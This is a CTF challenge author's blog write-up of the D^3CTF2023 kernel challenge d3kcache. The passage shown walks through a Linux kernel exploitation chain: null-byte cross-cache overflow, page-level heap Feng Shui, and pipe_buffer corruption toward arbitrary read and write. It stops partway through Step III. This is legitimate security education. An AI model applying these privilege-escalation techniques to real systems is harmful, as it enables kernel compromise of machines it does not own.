<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="arttnba3">


    <meta name="subtitle" content="arttnba3的秘密小屋">


    <meta name="description" content="あがいた夢を捨てて揺れる今日は眠って誤魔化せ">



<title>【CTF.0x08】D^ 3CTF2023 d3kcache： From null-byte cross-cache overflow to infinite arbitrary read &amp; write. | arttnba3&#39;s blog</title>



    <link rel="icon" href="/img/favicon.png">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
    "HTML-CSS": {
        preferredFont: "TeX",
        availableFonts: ["STIX","TeX"],
        linebreaks: { automatic:true },
        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
    },
    tex2jax: {
        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
        processEscapes: true,
        ignoreClass: "tex2jax_ignore|dno",
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    TeX: {
        equationNumbers: { autoNumber: "AMS" },
        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
        Macros: { href: "{}" }
    },
    messageStyle: "none"
    });
</script>
<!-- 给MathJax元素添加has-jax class -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>
<!-- 通过连接CDN加载MathJax的js代码 -->
<script type="text/javascript" async
        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
</script>


    


<meta name="generator" content="Hexo 6.2.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">「arttnba3」&#39;s reservation</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" target="_blank" rel="noopener" href="https://github.com/arttnba3">Github</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">「arttnba3」&#39;s reservation</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" target="_blank" rel="noopener" href="https://github.com/arttnba3">Github</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    var tocbot_timer;
    var DEPTH_MAX = 6; // 为 6 时展开所有
    var tocbot_default_config = {
        tocSelector: '.tocbot-list',
        contentSelector: '.post-content',
        headingSelector: 'h1, h2, h3, h4, h5',
        orderedList: false,
        scrollSmooth: true,
        onClick: extend_click,
    };

    function extend_click() {
        clearTimeout(tocbot_timer);
        tocbot_timer = setTimeout(function() {
            tocbot.refresh(obj_merge(tocbot_default_config, {
                hasInnerContainers: true
            }));
        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
    }

    document.ready(function() {
        tocbot.init(obj_merge(tocbot_default_config, {
            collapseDepth: 1
        }));
    });

    function expand_toc() {
        var b = document.querySelector('.tocbot-toc-expand');
        var expanded = b.getAttribute('data-expanded');
        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
        tocbot.refresh(obj_merge(tocbot_default_config, {
            collapseDepth: expanded ? 1 : DEPTH_MAX
        }));
        b.innerText = expanded ? 'Expand all' : 'Collapse all';
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

    function obj_merge(target, source) {
        for (var item in source) {
            if (source.hasOwnProperty(item)) {
                target[item] = source[item];
            }
        }
        return target;
    }
</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">【CTF.0x08】D^ 3CTF2023 d3kcache： From null-byte cross-cache overflow to infinite arbitrary read &amp; write.</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">arttnba3</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">五月 2, 2023&nbsp;&nbsp;3:13:27</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/CTF/">CTF</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <p>「さらば、全てのリヌクス カーネル エクスプロイテーション。」</p>
<span id="more"></span>

<h1 id="0x00-Before-we-start"><a href="#0x00-Before-we-start" class="headerlink" title="0x00. Before we start"></a>0x00. Before we start</h1><p>It may be my last time to design the Pwn challenge for <a target="_blank" rel="noopener" href="https://d3ctf.io/">D^3CTF</a> before my undergraduate graduation. Although I have always wanted to come up with some good challenges, I have been too inexperienced to create anything particularly outstanding. I hope that this time I can bring you with something special : ) </p>
<p>The challenge comes from the question that I’m always thinking about:</p>
<ul>
<li>As a hacker, how extreme the environment is can we  still complete the exploitation to the vulnerabilities?  Can we develop a <strong>universal exploitation</strong> that is not just the ideal one in lab environment but the powerful one that can be applied to the real-world vulnerabilities?</li>
</ul>
<p>Google has shown us how to turn a 2-byte heap-out-of-bound vulnerability into a universal solution in <a target="_blank" rel="noopener" href="https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html">CVE-2021-22555</a>. BitsByWill demonstrated the powerful page-level heap Feng Shui that can break the isolation between <code>kmem_cache</code> in <a target="_blank" rel="noopener" href="https://www.willsroot.io/2022/08/reviving-exploits-against-cred-struct.html">corCTF2022</a> . D3v17 archive the privilege escalation with only a single null-byte heap overflow vulnerability using the <a target="_blank" rel="noopener" href="https://syst3mfailure.io/corjail/">poll_list</a>, and Kylebot converted it into a cross-cache overflow exploit using the <a target="_blank" rel="noopener" href="https://www.starlabs.sg/blog/2022/06-io_uring-new-code-new-bugs-and-a-new-exploit-technique/#unlinking-attack">unlinking attack</a>. So, what’s next?</p>
<ul>
<li>If the size of the struct where the vulnerability located is not appropriate, or the struct itself cannot help us exploit the vulnerability, we have to use struct like <code>msg_msg</code> to adapt. But such kernel struct is rare with many limitations in exploit(e.g. they’re usually with a troublesome header).</li>
<li>If the vulnerability exists in a standalone <code>kmem_cache</code>, we cannot exploit it with other struct’s help directly. The cross-cache overflow may be the only way to achive.</li>
<li>If we get only 1-byte overflow in vulnerability, or the system V IPC is banned, we cannot apply Google’s solution to construct a use-after-free.</li>
<li>If the memory is small, or the variables like <code>modprobe_path</code> is a static value, Kylebot’s unlink attack is  no longer available.</li>
<li>Though the D3v17’s <code>poll_list</code> may still be available, the first-level <code>poll_list</code> is always in order-3 pages. If the vulnerability located in other-size slab (e.g. order-0 pages), we must resort to more granular page-level heap Feng Shui, <strong>where inter-order Feng Shui will greatly reduce the success rate.</strong></li>
<li><strong>If the kernel has Control Flow Integrity enabled, or if we don’t even know the kernel image information, traditional ROP methods are essentially dead.</strong></li>
</ul>
<p>In such extreme conditions, can we still find a universal solution to exploit kernel vulnerabilities? This was my original idea when creating this challenge. :)</p>
<h1 id="0x01-Analysis"><a href="#0x01-Analysis" class="headerlink" title="0x01.Analysis"></a>0x01.Analysis</h1><p>There’s no doubt that it’s easy to reverse the kernel module I provided. It create an isolate <code>kmem_cache</code> that  can allocate objects in size 2048.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> KCACHE_SIZE 2048</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">d3kcache_module_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    kcache_jar = kmem_cache_create_usercopy(<span class="string">&quot;kcache_jar&quot;</span>, KCACHE_SIZE, <span class="number">0</span>, </span><br><span class="line">                         SLAB_HWCACHE_ALIGN | SLAB_PANIC | SLAB_ACCOUNT, </span><br><span class="line">                         <span class="number">0</span>, KCACHE_SIZE, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(kcache_list, <span class="number">0</span>, <span class="keyword">sizeof</span>(kcache_list));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The custom <code>d3kcache_ioctl()</code>  function provides a menu for allocating, appending, freeing, and reading objects from <code>kcache_jar</code> , and the vulnerability is just in appending data, where there is a null-byte buffer overflow  when writing surpasses 2048 bytes.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">d3kcache_ioctl</span><span class="params">(<span class="keyword">struct</span> file *__file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> param)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">        <span class="keyword">case</span> KCACHE_APPEND:</span><br><span class="line">            <span class="keyword">if</span> (usr_cmd.idx &lt; <span class="number">0</span> || usr_cmd.idx &gt;= KCACHE_NUM </span><br><span class="line">                || !kcache_list[usr_cmd.idx].buf) &#123;</span><br><span class="line">                printk(KERN_ALERT <span class="string">&quot;[d3kcache:] Invalid index to write.&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (usr_cmd.sz &gt; KCACHE_SIZE || </span><br><span class="line">                (usr_cmd.sz + kcache_list[usr_cmd.idx].size) &gt;= KCACHE_SIZE) &#123;</span><br><span class="line">                size = KCACHE_SIZE - kcache_list[usr_cmd.idx].size;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                size = usr_cmd.sz;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            kcache_buf = kcache_list[usr_cmd.idx].buf;</span><br><span class="line">            kcache_buf += kcache_list[usr_cmd.idx].size;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (copy_from_user(kcache_buf, usr_cmd.buf, size)) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            kcache_buf[size] = <span class="string">&#x27;\0&#x27;</span>; <span class="comment">/* vulnerability */</span></span><br><span class="line"></span><br><span class="line">            retval = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">//...</span></span><br></pre></td></tr></table></figure>

<p>We can also find that the Control Flow Integrity is enabled while checking the <code>config</code> file provided.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_CFI_CLANG=y</span><br></pre></td></tr></table></figure>

<h1 id="0x02-Exploitation"><a href="#0x02-Exploitation" class="headerlink" title="0x02. Exploitation"></a>0x02. Exploitation</h1><p>As the <code>kmem_cache</code> is an isolate one, we cannot allocate other regular kernel structs from it, so the <strong>cross-cache overflow</strong> is the only solution at the very beginning.</p>
<h2 id="Step-I-Use-page-level-heap-Feng-Shui-to-construct-a-stable-cross-cache-overflow"><a href="#Step-I-Use-page-level-heap-Feng-Shui-to-construct-a-stable-cross-cache-overflow" class="headerlink" title="Step.I - Use page-level heap Feng Shui to construct a stable cross-cache overflow."></a>Step.I - Use page-level heap Feng Shui to construct a stable cross-cache overflow.</h2><p>To ensure stability of the overflow, we use the page-level heap Feng Shui there to construct a <strong>overflow layout</strong>. </p>
<h3 id="How-it-works"><a href="#How-it-works" class="headerlink" title="How it works"></a>How it works</h3><p>Page-level heap Feng Shui is a technique that is not really new, but rather a somewhat new utilization technique. As the name suggests, page-level heap Feng Shui is the memory re-arrangement technique with the granularity of memory pages. The current layout of memory pages in kernel is not only unknown to us but also has a huge amount of information, so the technique is <strong>to construct a new known and controlable page-level granularity memory page layout manually.</strong></p>
<p>How can we achieve that? Let’s rethink about the process how the slub allocator requests pages from buddy system. When the slab pages it use as the freelist has run out and the partial list of <code>kmem_cache_node</code>  is empty, or it’s the first time to allocate, the slub allocator will request pages from buddy system.</p>
<p><img src="https://s2.loli.net/2023/01/19/yPtXiwzVfxWH7lE.png" alt="image.png"></p>
<p>The next one we need to rethink about is how the buddy system allocates pages. It takes the <code>2^order</code> memory pages as the granularity of allocation and the free pages in different order are in different linked lists. While the list of allocated order cannot provide the free pages, the one from list of higher order will be divided into two parts: one for the caller and the other return to corresponding list. The following figure shows how the buddy system works actually.</p>
<p><img src="https://s2.loli.net/2023/01/19/79biltjNfACIZcP.gif" alt="page.gif"></p>
<p>Notice that the two low-order continuous memory pages obtained by splitting them from a higher-order are <strong>physically contiguous</strong>. Thus, we can:</p>
<ul>
<li>Request two continuous memory pages from the buddy system.v</li>
<li>Release one of the memory pages, do the heap spraying on <strong>vulnerable</strong>  <code>kmem_cache</code>, which will make it take away this memory pages.</li>
<li>Release the other memory page, do the heap spraying on <strong>victim</strong>  <code>kmem_cache</code>, which will make it take away this memory pages.</li>
</ul>
<p>Now the vulnerable and victim <code>kmem_cache</code> both hold the memory pages that are near by each other’s one, which allow us to achive the <strong>cross-cache overflow.</strong></p>
<h3 id="How-we-exploit"><a href="#How-we-exploit" class="headerlink" title="How we exploit"></a>How we exploit</h3><p>There’re many kernel APIs that can request pages directly from the buddy system. Here we’ll use the solution from  <a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html">CVE-2017-7308</a>.</p>
<p>When we create a socket with the  <code>PF_PACKET</code> protocol, call the  <code>setsockopt()</code> to set the  <code>PACKET_VERSION</code> as <code>TPACKET_V1 </code>&#x2F; <code>TPACKET_V2</code> , and hand in a  <code>PACKET_TX_RING</code> by  <code>setsockopt()</code> , there is a call chain like this:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__sys_setsockopt()</span><br><span class="line">    sock-&gt;ops-&gt;setsockopt()</span><br><span class="line">    	packet_setsockopt() <span class="comment">// case PACKET_TX_RING ↓</span></span><br><span class="line">    		packet_set_ring()</span><br><span class="line">    			alloc_pg_vec()</span><br></pre></td></tr></table></figure>

<p>A <code>pgv</code> struct will be allocated to allocate <code>tp_block_nr</code> parts of <code>2^order</code> memory pages,  where the <code>order</code> is determined by <code>tp_block_size</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> pgv *<span class="title function_">alloc_pg_vec</span><span class="params">(<span class="keyword">struct</span> tpacket_req *req, <span class="type">int</span> order)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> block_nr = req-&gt;tp_block_nr;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pgv</span> *<span class="title">pg_vec</span>;</span></span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">	pg_vec = kcalloc(block_nr, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pgv), GFP_KERNEL | __GFP_NOWARN);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!pg_vec))</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; block_nr; i++) &#123;</span><br><span class="line">		pg_vec[i].buffer = alloc_one_pg_vec_page(order);</span><br><span class="line">		<span class="keyword">if</span> (unlikely(!pg_vec[i].buffer))</span><br><span class="line">			<span class="keyword">goto</span> out_free_pgvec;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> pg_vec;</span><br><span class="line"></span><br><span class="line">out_free_pgvec:</span><br><span class="line">	free_pg_vec(pg_vec, order, block_nr);</span><br><span class="line">	pg_vec = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The  <code>alloc_one_pg_vec_page()</code> will call the  <code>__get_free_pages()</code> to request pages from buddy system, which allow us to acquire tons of pages in different order:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">char</span> *<span class="title function_">alloc_one_pg_vec_page</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> order)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> *buffer;</span><br><span class="line">	<span class="type">gfp_t</span> gfp_flags = GFP_KERNEL | __GFP_COMP |</span><br><span class="line">			  __GFP_ZERO | __GFP_NOWARN | __GFP_NORETRY;</span><br><span class="line"></span><br><span class="line">	buffer = (<span class="type">char</span> *) __get_free_pages(gfp_flags, order);</span><br><span class="line">	<span class="keyword">if</span> (buffer)</span><br><span class="line">		<span class="keyword">return</span> buffer;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Correspondingly the pages in <code>pgv</code> will be released after the socket is closed.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">packet_release()</span><br><span class="line">    packet_set_ring()</span><br><span class="line">    	free_pg_vec()</span><br></pre></td></tr></table></figure>

<p>Such features in  <code>setsockopt()</code>  allow us to achieve the <strong>page-level heap Feng Shui.</strong> Note that we should avoid those noisy objects (additional memory allocation) corruptting our page-level heap layout. Thus what we should do is to pre-allocate some pages before we allocate the pages for page-level heap Feng Shui. <strong>As the buddy system is a LIFO poo</strong>l, we can free these pre-allocated pages when the slab is being running out.</p>
<p>Thus, <strong>we can obtain the page-level control over a continuous block of memory</strong>, which allow us to construct a special memory layout within follow steps:</p>
<ul>
<li>First, release a portion of the pages so that the victim object obtains these pages.</li>
<li>Then, release a block of pages and do the allocation on the kernel module, making it request this block from the buddy system.</li>
<li>Finally, release another portion of the pages so that the victim object obtains these pages.</li>
</ul>
<p>As a result, the vulnerable slab pages will be around with the victim objects’ slab pages as the figure shown, which ensure the stablity of cross-cache overflow.</p>
<p><img src="https://s2.loli.net/2023/05/02/VvPk5nKYmDCWxOs.png" alt="cross-cache overflow layout"></p>
<h2 id="Step-II-Use-fcntl-F-SETPIPE-SZ-to-extend-pipe-buffer-construct-page-level-UAF"><a href="#Step-II-Use-fcntl-F-SETPIPE-SZ-to-extend-pipe-buffer-construct-page-level-UAF" class="headerlink" title="Step.II - Use fcntl(F_SETPIPE_SZ) to extend pipe_buffer, construct page-level UAF"></a>Step.II - Use fcntl(F_SETPIPE_SZ) to extend pipe_buffer, construct page-level UAF</h2><p>Now let’s consider the victim object as the target of cross-cache overflow. I believe that the powerful <code>msg_msg</code> is the first one that comes to everyone’s mind. But we’ve use <code>msg_msg</code> for too many times in the past exploitation on many vulnerabilities. So I’d like to explore somthing new this time. : )</p>
<p><img src="https://s2.loli.net/2023/05/03/EIrSicx56qHLC1X.png" alt="BGM:What is love"></p>
<p>Due to the only one-byte overflow, there’s no doubt that we should find those structs with pointers pointing to some other kernel objects in their header. The <code>pipe_buffer</code> is such a good boy with a pointer pointing to a struct <code>page</code> at the beginning of it. What’s more is that the size of struct <code>page</code> is only <code>0x40</code>, and a null-byte overflow can set a byte to <code>\x00</code>, which means that <strong>we can make a</strong> <code>pipe_buffer</code> <strong>point to another page with a 75% probability.</strong> </p>
<p>So if we spray <code>pipe_buffer</code> and do the null-byte cross-cache overflow on it, there’s a high probability to <strong>make two</strong> <code>pipe_buffer</code> <strong>point to the same struct</strong> <code>page</code>. When we release one of them, <strong>we’ll get a page-level use-after-free</strong>. It’s as shown in following figures.</p>
<p><img src="https://s2.loli.net/2023/05/02/JLZOKejgoPdTkYA.png" alt="original state"></p>
<p><img src="https://s2.loli.net/2023/05/02/MwTSWUbeaY9Puro.png" alt="null-byte partial overwrite"></p>
<p><img src="https://s2.loli.net/2023/05/02/R3reNIAT1lG7sfw.png" alt="page-level UAF"></p>
<p>What’s more is that the function of pipe itself <strong>allow us to read and write this UAF page.</strong> I don’t know whether there’s another good boy can do the same as the <code>pipe</code> does :  )</p>
<p>But there’s another problem, the <code>pipe_buffer</code> comes from the <code>kmalloc-cg-1k</code> pool, which requests order-2 pages, and the vulnerable kernel module requests the order-3 ones. If we perform the heap Feng Shui between dirfferent order directly, the success rate of the exploit will be greatly reduced :(</p>
<p>Luckily the <code>pipe</code> is much more powerful than I’ve ever imagined. We’ve known that the <code>pipe_buffer</code> we said is actually an array of struct <code>pipe_buffer</code> and the number of it is <code>pipe_bufs</code> .</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> pipe_inode_info *<span class="title function_">alloc_pipe_info</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">	pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer),</span><br><span class="line">			     GFP_KERNEL_ACCOUNT);</span><br></pre></td></tr></table></figure>

<p>Note that the number of struct <code>pipe_buffer</code> <strong>is not a constant</strong>, we may come up with a question: <strong>can we resize the number of</strong> <code>pipe_buffer</code> <strong>in the array?</strong> The answer is yes. We can use <code>fcntl(F_SETPIPE_SZ)</code> to <strong>acjust the number of</strong> <code>pipe_buffer</code> <strong>in the array</strong>, which is a re-allocation in fact.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">pipe_fcntl</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line">	<span class="type">long</span> ret;</span><br><span class="line"></span><br><span class="line">	pipe = get_pipe_info(file, <span class="literal">false</span>);</span><br><span class="line">	<span class="keyword">if</span> (!pipe)</span><br><span class="line">		<span class="keyword">return</span> -EBADF;</span><br><span class="line"></span><br><span class="line">	__pipe_lock(pipe);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">	<span class="keyword">case</span> F_SETPIPE_SZ:</span><br><span class="line">		ret = pipe_set_size(pipe, arg);</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">pipe_set_size</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *pipe, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">	ret = pipe_resize_ring(pipe, nr_slots);</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">pipe_resize_ring</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *pipe, <span class="type">unsigned</span> <span class="type">int</span> nr_slots)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> head, tail, mask, n;</span><br><span class="line"></span><br><span class="line">	bufs = kcalloc(nr_slots, <span class="keyword">sizeof</span>(*bufs),</span><br><span class="line">		       GFP_KERNEL_ACCOUNT | __GFP_NOWARN);</span><br></pre></td></tr></table></figure>

<p>Thus, we can easily <strong>reallocate the number of</strong> <code>pipe_buffer</code> to do a re-allocation: for each pipe, we’d like to <strong>allocate 64</strong> <code>pipe_buffer</code>, <strong>making it request an order-3 page from</strong> <code>kmalloc-cg-2k</code>, which is the same order as the vulnerable kernel module. So that the cross-cache overflow is in a high reliability.</p>
<p>Note that the size of struct <code>page</code> is <code>0x40</code>, which means that the last byte of a pointer pointing to it can be <code>\x00</code>. If we make a cross-cache overflow on such <code>pipe_buffer</code>, it’s equal to nothing happen. So the actual rate of a successful exploitation is only 75% :  (</p>
<h2 id="Step-III-Construct-self-writing-pipes-to-achive-the-arbitrary-read-amp-write"><a href="#Step-III-Construct-self-writing-pipes-to-achive-the-arbitrary-read-amp-write" class="headerlink" title="Step.III - Construct self-writing pipes to achive the arbitrary read &amp; write"></a>Step.III - Construct self-writing pipes to achive the arbitrary read &amp; write</h2><p>As the <code>pipe</code> itself provide us with the ability to do the read and write to specific page, and the size of <code>pipe_buffer</code> array can be control by us, it couldn’t be better to choose the <code>pipe_buffer</code> as the victim object again on the UAF page :  )</p>
